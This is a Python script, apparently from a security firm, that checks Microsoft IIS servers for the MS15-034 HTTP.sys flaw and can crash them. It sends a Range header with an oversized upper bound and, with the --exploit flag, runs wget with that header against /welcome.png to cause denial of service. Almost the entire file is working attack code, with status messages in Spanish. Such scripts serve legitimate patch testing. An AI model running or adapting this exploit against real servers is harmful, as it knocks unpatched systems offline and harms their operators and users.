# written by john.b.hale@gmail.com - 2015-04-15
# args added and reformated by Juan Cruz Tommasi 13/04/2020
# usage for poc: python xploit.py -t <hostAddr> -p <port>
# exploiting usage: python xploit.py -t <hostAddr> -p <port> --exploit

import socket
import random
from argparse import ArgumentParser
import os

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def banner():
    print(bcolors.OKGREEN + "\n\n                     ███████████████████████████")
    print("                     ███████▀▀▀░░░░░░░▀▀▀███████")
    print("                     ████▀░░░░░░░░░░░░░░░░░▀████")
    print("                     ███│░░░░░░░░░░░░░░░░░░░│███          MS15-034")
    print("                     ██▌│░░░░░░░░░░░░░░░░░░░│▐██          PoC & DoS Exploit")
    print("                     ██░└┐░░░░░░░░░░░░░░░░░┌┘░██          by Juan Cruz Tommasi")
    print("                     ██░░└┐░░░░░░░░░░░░░░░┌┘░░██")
    print("                     ██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██")
    print("                     ██▌░│██████▌░░░▐██████│░▐██")
    print("                     ███░│▐███▀▀░░▄░░▀▀███▌│░███")
    print("                     ██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██          Base4 Security")
    print("                     ██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██          www.base4sec.com")
    print("                     ████▄─┘██▌░░░░░░░▐██└─▄████")
    print("                     █████░░▐█─┬┬┬┬┬┬┬─█▌░░█████")
    print("                     ████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████")
    print("                     █████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████")
    print("                     ███████▄░░░░░░░░░░░▄███████")
    print("                     ██████████▄▄▄▄▄▄▄██████████")
    print("                     ███████████████████████████\n\n" + bcolors.ENDC)

hr = "\n##########################################################################################################################\n"

def str2bool(v):
    if isinstance(v, bool):
        return v
    if v.lower() in ('yes', 'true', 't', 'y', '1'):
        return True
    if v.lower() in ('no', 'false', 'f', 'n', '0'):
        return False
    else:
        raise argparse.ArgumentTypeError('Boolean Value Expected')

parser = ArgumentParser(description='Microsoft Windows - HTTP.sys - DoS')
parser.add_argument('-t', '--targethost', type=str, metavar='',required=True, help='Remote Host')
parser.add_argument('-p', '--port', type=int, metavar='', required=True, help='Remote Port')
parser.add_argument('--exploit', type=str2bool, nargs='?', const=True, default=False, help='EXPLOIT!')
args = parser.parse_args()

ipAddr = args.targethost
port = args.port
hexAllFfff = b'18446744073709551615'

req1 = b'GET / HTTP/1.0\r\n\r\n'
req = b'GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-' + hexAllFfff + b'\r\n\r\n'
xploit = b'GET /welcome.png HTTP/1.1\r\nHost: stuff\r\nRange: bytes=18-' + hexAllFfff + b'\r\n\r\n'

banner()

print('[*] Testeando la vulnerabilidad..')

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((ipAddr, port))
client_socket.send(req1)
r = client_socket.recv(1024)
if b'Microsoft' not in r:
                print('[*] El objetivo no es IIS')
                exit(0)
client_socket.close()

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((ipAddr, port))
if args.exploit != 0:
    url = str('http://'+ipAddr+':'+str(port)+'/welcome.png')
    print('[*] Lanzando ataque de denegacion de servicio al servidor: ' + url)
    cmd = 'wget --header="Range: bytes=18-18446744073709551615" ' + url
    print('[!!] Payload enviado')
    os.system(cmd)
else:
    client_socket.send(req)
r = client_socket.recv(1024)
client_socket.close()

if b'Requested Range Not Satisfiable' in r:
                print('[!!] El host parece Vulnerable a DoS')

elif b' The request has an invalid header name' in r:
                print('[*] Parece que no es vulnerable .. :(')
else:
                print('[*] Respuesta desconocida, no podemos identificar si es vulnerable')
